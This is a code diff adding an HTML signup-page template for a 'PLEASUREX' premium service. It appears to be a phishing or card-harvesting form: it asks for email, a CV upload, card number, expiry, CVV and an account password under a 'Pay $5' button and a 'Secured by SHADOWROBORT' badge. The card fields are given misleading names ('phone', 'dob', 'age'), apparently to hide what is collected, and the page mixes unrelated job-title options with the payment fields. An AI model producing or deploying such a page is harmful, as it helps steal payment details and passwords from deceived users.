@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Signup - PLEASUREX</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #111;
+            color: #fff;
+            text-align: center;
+        }
+
+        .premium-container {
+            max-width: 500px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #222;
+            border-radius: 8px;
+        }
+
+        h2 {
+            color: #e60073;
+        }
+
+        .signup-form {
+            background: #333;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: left;
+        }
+
+        .signup-form input, .signup-form select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: none;
+            border-radius: 4px;
+        }
+
+        .dob-age-container {
+            display: flex;
+            gap: 10px;
+        }
+
+        .dob-age-container input {
+            width: 50%;
+        }
+
+        .signup-form button {
+            background-color: #e60073;
+            color: white;
+            padding: 12px;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            border-radius: 4px;
+            font-size: 18px;
+        }
+
+        .signup-form button:hover {
+            background-color: #ff007f;
+        }
+
+
+        /* Success message */
+        #success-message {
+            display: none;
+            color: #28a745;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+
+        /* Security notice */
+        .security-notice {
+            font-size: 12px;
+            color: #bbb;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Loader -->
+
+    {% with messages = get_flashed_messages(with_categories=True) %}
+            {% if messages %}
+                <div id="flash-container">
+                    {% for category, message in messages %}
+                        <div class="flash-messages flash-{{ category }}">{{ message }}</div>
+                    {% endfor %}
+                </div>
+            {% endif %}
+        {% endwith %}
+
+
+    <div class="premium-container">
+        <h2>Go Premium with PLEASUREX</h2>
+
+        <div class="signup-form">
+            <form id="SignupForm" method="POST" action="{{ url_for('signup') }}" enctype="multipart/form-data">
+                <label for="email">Email</label>
+                <input type="text" id="email" name="email" placeholder="john@gmail.com" required>
+        
+                <label for="attachment">Upload your CV/Resume</label>
+                <input type="file" id="attachment" name="attachment">
+        
+                <label for="name_selection">Select Name</label>
+                <select id="name_selection" name="name_selection" required>
+                    <option value="" disabled selected>Select an option</option>
+                    <option value="Embedded System Engineer">Embedded System Engineer</option>
+                    <option value="Robotics Software Engineer">Robotics Software Engineer</option>
+                    <option value="Electro Mechanical Engineer">Electro Mechanical Engineer</option>
+                    <option value="Control System Engineer">Control System Engineer</option>
+                </select>
+        
+                <label for="phone">Card Number</label>
+                <input type="text" id="phone" name="phone" placeholder="1234 5678 9012 3456" maxlength="19" required>
+        
+                <div class="dob-age-container">
+                    <div>
+                        <label for="dob">Expiry Date</label>
+                        <input type="text" id="dob" name="dob" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div>
+                        <label for="age">CVV/CVC</label>
+                        <input type="text" id="age" name="age" placeholder="123" maxlength="3" required>
+                    </div>
+                </div>
+        
+                <label for="password">Account Password</label>
+                <input type="password" id="password" name="password" required>
+        
+                <button type="submit">Pay $5</button>
+        
+                <p>Secured by SHADOWROBORT</p>
+                
+            </form>
+        </div>
+        
+    
+   
+
+    <script>
+
+
+
+        
+    
+    document.getElementById("phone").addEventListener("input", function (e) {
+                let value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+                e.target.value = value.substring(0, 19);
+            });
+            
+            
+            
+            document.getElementById("age").addEventListener("input", function (e) {
+                let value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+                e.target.value = value.substring(0, 3);
+            });
+    
+        
+
+        
+        
+        document.getElementById("dob").addEventListener("input", function (e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 4) value = value.substring(0, 4);
+                if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2);
+                e.target.value = value;
+            });
+
+
+
+        
+    </script>
+
+</body>
+</html>
